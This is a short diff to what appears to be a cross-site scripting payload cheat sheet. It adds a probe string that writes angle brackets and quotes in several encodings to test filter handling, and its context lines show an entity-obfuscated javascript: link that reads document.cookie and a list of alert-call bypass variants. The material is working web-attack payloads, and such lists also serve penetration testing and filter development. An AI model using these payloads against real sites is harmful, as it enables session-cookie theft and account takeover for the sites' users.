@@ -19,6 +19,19 @@
 <a/href="j&#97v&#97script&#x3A;&#97lert(document.cookie)">ClickMe
 
 
+# check alternative is possible
+<"'>\u003C\u0022\u0027\u003E%3C%22%27%3E&lt;&quot;&#39;&gt;&#x3c;&#x22;&#x27;&#x3e;&#60;&#34;&#39;&#62;
+
+<"'>
+\u003C\u0022\u0027\u003E
+%3C%22%27%3E
+&lt;&quot;&#39;&gt;
+&#x3c;&#x22;&#x27;&#x3e;
+&#60;&#34;&#39;&#62;
+
+
+
+
 # bypass ways
 window.alert()
 window['alert']()
